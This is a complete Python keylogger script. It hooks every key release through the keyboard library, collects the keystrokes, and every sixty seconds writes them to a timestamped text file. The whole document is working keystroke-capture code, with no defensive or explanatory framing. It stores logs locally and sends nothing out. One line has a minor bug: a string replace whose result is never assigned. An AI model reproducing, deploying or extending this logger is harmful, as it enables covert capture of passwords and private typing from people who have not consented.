#!/usr/bin/python3

import keyboard
from threading import Timer
from datetime import datetime
from colorama import init, Fore
from keyboard._keyboard_event import KeyboardEvent

class KeyLogger:
	def __init__(self, interval: int, report_method: str = 'log'):
		init()

		self.interval = interval
		self.report_method = report_method

		self.log = ''

		self.start_dt = datetime.now()
		self.end_dt = datetime.now()

	def callback(self, event: KeyboardEvent):
		name = event.name

		if len(name) > 1:
			if name == 'space':
				name = ' '
			elif name == 'enter':
				name = '[ENTER]\n'
			elif name == 'decimal':
				name = '.'
			else:
				name.replace(' ','_')
				name = f'[{name.upper()}]'

		self.log += name

	def update_filename(self):
		start_dt_str = str(self.start_dt).replace(' ','-').replace(':','')
		end_dt_str = str(self.end_dt).replace(' ','-').replace(':','')
		self.filename = f'keylog-{start_dt_str}_{end_dt_str}'

	def report_to_file(self):
		GREEN = Fore.GREEN
		WHITE = Fore.WHITE

		with open(f'{self.filename}.txt', 'w+') as f:
			print(self.log, file=f)
		print(f'{GREEN} [+] SAVED {self.filename}.TXT {WHITE}')

	def report(self):
		if self.log:
			self.end_dt = datetime.now()
			self.update_filename()

			if self.report_method == 'log':
				self.report_to_file()

			self.start_dt = datetime.now()

		self.log = ''
		
		timer = Timer(interval=self.interval, function=self.report)
		timer.daemon = True
		timer.start()

	def start(self):
		self.start_dt = datetime.now()

		keyboard.on_release(callback=self.callback)

		self.report()
		keyboard.wait()

if __name__ == '__main__':
	keylogger = KeyLogger(interval=60)
	keylogger.start()